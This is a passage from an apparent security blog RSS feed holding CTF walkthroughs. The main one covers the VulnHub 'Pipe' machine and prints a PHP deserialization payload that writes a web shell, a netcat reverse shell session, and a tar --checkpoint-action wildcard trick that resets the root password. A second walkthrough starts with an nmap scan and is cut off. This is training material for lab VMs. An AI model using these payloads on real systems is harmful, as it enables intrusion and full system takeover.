// bugfixed by: Russell Walker &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.nbill.co.uk/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// bugfixed by: Jamie Beck &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.terabit.ca/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// bugfixed by: Kevin van Zonneveld
//  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://kevin.vanzonneveld.net/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
// bugfixed by: Ben &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://benblume.co.uk/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
//    input by: DtTvB  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://dt.in.th/2008-09-16.string-length-in-bytes.h
//    input by: Martin &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.erlenwiese.de/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
//        note: We feel the main purpose of this &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;should be to ease the transport of data between php &amp;amp; js
//        note: Aiming &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;PHP-compatibility, we have to translate objects to arrays
//   example 1: serialize&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Kevin'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'van'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'Zonneveld'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
//   returns 1:&lt;span class=&quot;s1&quot;&gt;'a:3:{i:0;s:5:&quot;Kevin&quot;;i:1;s:3:&quot;van&quot;;i:2;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;
//   example 2: serialize&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;firstName:&lt;span class=&quot;s1&quot;&gt;'Kevin'&lt;/span&gt;, midName: &lt;span class=&quot;s1&quot;&gt;'van'&lt;/span&gt;, surName:&lt;span class=&quot;s1&quot;&gt;'Zonneveld'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
//   returns 2: &lt;span class=&quot;s1&quot;&gt;'a:3:{s:9:&quot;firstName&quot;;s:5:&quot;Kevin&quot;;s:7:&quot;midName&quot;;s:3:&quot;van&quot;;s:7:&quot;surName&quot;;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;logphpbak-interrogation&quot;&gt;log.php.BAK Interrogation&lt;/h3&gt;

&lt;p&gt;Inspection of the source revealed it works with the js file for serialization.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/log.php.BAK.png&quot; alt=&quot;log.php.BAK Source Code Review&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;burp-suite---post-request&quot;&gt;Burp Suite - POST Request&lt;/h2&gt;

&lt;p&gt;Modifying the request from GET to POST, renendered the index.php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-post.png&quot; alt=&quot;Burp POST instead of GET&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Burp confirmed the Serialized object:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-serialized-object.png&quot; alt=&quot;Burp Serialized Object&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;burp-decode-string&quot;&gt;Burp decode string&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-decode-string.png&quot; alt=&quot;Burp Decode String&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Right click the string, send to Decoder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-decoder-smart-decode.png&quot; alt=&quot;Burp Decoder Smart Decoder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Click “Smart decode”&lt;/p&gt;

&lt;p&gt;Using the example section of the previously discovered php.js file, it was
possible to workout the serialization mechanism.&lt;/p&gt;

&lt;p&gt;New modified string introduced with burp:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/var/www/html/scriptz/Meh1.txt&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;HighOnCoffee&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Using Burp Decoder URL Encode the above string and using Burp Repeater to
inject.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-repeater.png&quot; alt=&quot;Burp Repeater&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Refreshing the scriptz directory confirmed the creation of Meh.txt containing
the text &lt;code&gt;HighOnCoffee&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;injecting-reverse-shell-code&quot;&gt;Injecting Reverse Shell Code&lt;/h2&gt;

&lt;p&gt;Burp Decoder was leveraged to encode the following string:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/var/www/html/scriptz/shell.php&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
&amp;lt;?php echo '&amp;lt;pre&amp;gt;'; system($_GET['cmd']); echo '&amp;lt;/pre&amp;gt;'; ?&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Select Encode as URL.&lt;/p&gt;

&lt;p&gt;Paste encoded string into Burp Repeater:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/burp-repeater-shell.png&quot; alt=&quot;Burp Repeater PHP Shell Upload&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;php-shell&quot;&gt;PHP Shell&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/php-shell-rce.png&quot; alt=&quot;PHP Shell RCE&quot; /&gt;’&lt;/p&gt;

&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h2&gt;

&lt;p&gt;nc is installed on the target, the php shell introduced at the previous step is leveraged to execute a netcat reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/rev-shell-exec.png&quot; alt=&quot;Execute Netcat&quot; /&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;listening&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;any&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;30.134&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UNKNOWN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;30.142&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37957&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;linux-local-privilege-escalation&quot;&gt;Linux Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Spawn tty:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Get HighOn.Coffee linux local enumeration script:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;wget https://highon.coffee/downloads/linux-local-enum.sh&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/enum-rene-home.png&quot; alt=&quot;HighOn.Coffee script enum&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Inspection of &lt;code&gt;/etc/crontab&lt;/code&gt; exposed the script
&lt;code&gt;/usr/bin/compress.sh&lt;/code&gt; which is world readable.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/crontab.png&quot; alt=&quot;crontab&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tar--unix-wildcards-local-privilege-escalation&quot;&gt;Tar  Unix Wildcards Local Privilege Escalation&lt;/h2&gt;

&lt;h3 id=&quot;unix-wildcards&quot;&gt;Unix Wildcards&lt;/h3&gt;
&lt;p&gt;The previously discovered backup script uses * to perform a backup of all files
within the directory &lt;code&gt;/home/rene/backup/&lt;/code&gt;. Due to poorly configured file system
permission on the backup directory, it’s possible to introduce files in the
backup directory which tar will process when it backs up the files in the directory.&lt;/p&gt;

&lt;h3 id=&quot;tar-arbitrary-command-execution&quot;&gt;Tar Arbitrary Command Execution&lt;/h3&gt;

&lt;p&gt;Tar’s &lt;code&gt;--checkpoint-action&lt;/code&gt; parameter can be abused to
execute arbitrary code as the user executing the tar binary.
&lt;code&gt;--checkpoint-action&lt;/code&gt; exists as a tar feature allowing binary
execution of a command when the file prefixed with
&lt;code&gt;--checkpoint-action=exec=COMMAND-HERE&lt;/code&gt; is reached.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;passwd.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&amp;lt;ckup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint-action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sh&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;passwd.sh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                        
www-data@pipe:/home/rene/backup&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--checkpoint&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The above leverages the tar arbitrary command execution, reseting the root
account password when the cronjob is processed (every 5 minutes).&lt;/p&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;

&lt;p&gt;After 5 minutes, escalate root privileges by executing &lt;code&gt;su -&lt;/code&gt;
and entering the password &lt;code&gt;passwd&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/pipe/pipe-root-flag.png&quot; alt=&quot;Pipe Root Flag VulnHub&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Lord of the Root Walkthrough CTF</title>
          <link>https://highon.coffee/blog/lord-of-the-root-walkthrough/</link>
          <pubDate>Tue, 24 Nov 2015 00:12:52 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lord-of-the-root-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&amp;lt;/i&amp;gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sqlmap&quot; id=&quot;markdown-toc-sqlmap&quot;&gt;SQLMAP&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-enumerate-databases&quot; id=&quot;markdown-toc-sqlmap-enumerate-databases&quot;&gt;SQLMap Enumerate Databases&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-full-command&quot; id=&quot;markdown-toc-sqlmap-full-command&quot;&gt;SQLMap Full Command&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#sqlmap-database-dump&quot; id=&quot;markdown-toc-sqlmap-database-dump&quot;&gt;SQLMap Database Dump&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-database-table-enumeration&quot; id=&quot;markdown-toc-sqlmap-database-table-enumeration&quot;&gt;SQLMap Database Table Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-enumerate-columns&quot; id=&quot;markdown-toc-sqlmap-enumerate-columns&quot;&gt;SQLMap Enumerate Columns&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-dump-passwords&quot; id=&quot;markdown-toc-sqlmap-dump-passwords&quot;&gt;SQLMap Dump Passwords&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-dump-mysql-db-and-crack-hashes&quot; id=&quot;markdown-toc-sqlmap-dump-mysql-db-and-crack-hashes&quot;&gt;SQLMap Dump MySQL DB and crack hashes&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#sqlmap-hash-cracking-options&quot; id=&quot;markdown-toc-sqlmap-hash-cracking-options&quot;&gt;SQLMap hash cracking options&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mysql-local-privilege-escalation&quot; id=&quot;markdown-toc-mysql-local-privilege-escalation&quot;&gt;MySQL Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root&quot; id=&quot;markdown-toc-root&quot;&gt;Root&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;
I created this machine to help others learn some basic CTF hacking strategies
and some tools. I aimed this machine to be very similar in difficulty to those
I was breaking on the OSCP.
&lt;/p&gt;

&lt;p&gt;##Enumeration&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 

V &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535  192.168.30.140  

Starting Nmap 7.00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2015-11-23 12:36 EST
Stats: 0:00:07 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing Connect Scan
Connect Scan Timing: About 2.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 12:40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:35 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.30.140
Host is up, received arp-response &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00037s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1337/tcp open  http    syn-ack Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
MAC Address: 00:0C:29:D0:63:8A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1
open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.37 ms 192.168.30.140

OS and Service detection performed. Please report any incorrect results at
https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.92 seconds
Enumeration process started. &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;###Service Enumeration&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
